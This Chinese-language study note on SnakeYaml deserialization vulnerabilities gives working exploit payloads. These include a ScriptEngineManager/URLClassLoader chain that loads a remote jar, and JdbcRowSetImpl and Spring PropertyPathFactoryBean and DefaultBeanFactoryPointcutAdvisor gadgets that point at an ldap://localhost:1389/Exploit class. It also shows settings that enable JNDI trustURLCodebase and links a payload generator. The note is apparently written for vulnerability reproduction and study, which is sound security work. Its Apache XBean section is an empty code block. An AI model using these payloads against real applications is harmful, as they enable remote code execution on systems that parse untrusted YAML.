# SnakeYaml 反序列化

>  序列化的流程

![image-20220225115239098](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220225115239098.png)

![](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220225115239098.png)

![image-20220225115345779](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220225115345779.png)

获取类的`fileds`，然后获取具体的数据，抽象成`Node`。

>反序列化

![image-20220225204927033](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220225204927033.png)

只能说，懂得都懂(

主要的还是通过`javax.script.ScriptEngineManager`的链子来利用。推测 fastjson的链子应该都可以使用(

```java
"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1/yaml-payload.jar\"]]]]"
```



## 漏洞复现

> poc生成:https://github.com/artsploit/yaml-payload
>
> 参考链接; https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x03-%E6%9B%B4%E5%A4%9AGadgets%E6%8E%A2%E7%A9%B6
>
> https://xz.aliyun.com/t/2042#toc-21

或者在web目录下面新建`/META-INF/services/javax.script.ScriptEngineFactory`然后来加载远程的恶意类。

> 在init()中调用了initEngines()，跟进initEngines()，**看到调用了`ServiceLoader<ScriptEngineFactory>`，这个就是Java的SPI机制，它会去寻找目标URL中`META-INF/services`目录下的名为javax.script.ScriptEngineFactory的文件，获取该文件内容并加载文件内容中指定的类即PoC，这就是前面为什么需要我们在一台第三方Web服务器中新建一个指定目录的文件，同时也说明了ScriptEngineManager利用链的原理就是基于SPI机制来加载执行用户自定义实现的ScriptEngineManager接口类的实现类，从而导致代码执行**：

其他的trick暂时不做过多的讨论了，因为和fastjson部分是差不多的，打算等到fastjson的时候细致地分析一波。RMI和LDAP了解的不是很深入，建议重新复习一下`EKI`的文章

:rabbit:**注意高版本的设置一下以下的两种属性**

- LDAP

```java
System.setProperty("com.sun.jndi.rmi.registry.trustURLCodebase","true");
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
```

- JdbcRowSetImpl

  ```java
  String poc = "!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \"ldap://localhost:1389/Exploit\"\n autoCommit: true";
  ```

  ![image-20220314205706320](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220314205706320.png)

- Spring PropertyPathFactoryBean

  > 需要在目标环境存在springframework相关的jar包，以我本地环境为例：snakeyaml-1.25，commons-logging-1.2，unboundid-ldapsdk-4.0.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE。

  ```java
  String poc = "!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n" +
                  " targetBeanName: \"ldap://localhost:1389/Exploit\"\n" +
                  " propertyPath: mi1k7ea\n" +
                  " beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n" +
                  "  shareableResources: [\"ldap://localhost:1389/Exploit\"]";
  ```

- Spring DefaultBeanFactoryPointcutAdvisor

  > 需要在目标环境存在springframework相关的jar包，以我本地环境为例：snakeyaml-1.25，commons-logging-1.2，unboundid-ldapsdk-4.0.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE，spring-aop-4.3.7.RELEASE。

  大概触发逻辑在保`org.springframework.jndi.support.SimpleJndiBeanFactory`

  大概讲述一下这个过程，首先新建的是`"set":"xxx"`这样的一个键值对，然后呢开始新建他的属性类`org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor`,我们可以看到这里新建了两个，在第二个属性新建完成在put进去的时候，会触发`AbstractPointcutAdvisor`的`equals`方法，然后，又到后面的方法，这里大概的逻辑就是通过对比`advise`中的factor来进行比对

  ```java
  set:
      ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor
        adviceBeanName: "ldap://localhost:1389/Exploit"
        beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
          shareableResources: ["ldap://localhost:1389/Exploit"]
      ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor []
  
  ```

- Apache XBean

  ```
  
  ```

  

## 不出网利用

>  参考链接:https://xz.aliyun.com/t/10655#toc-8

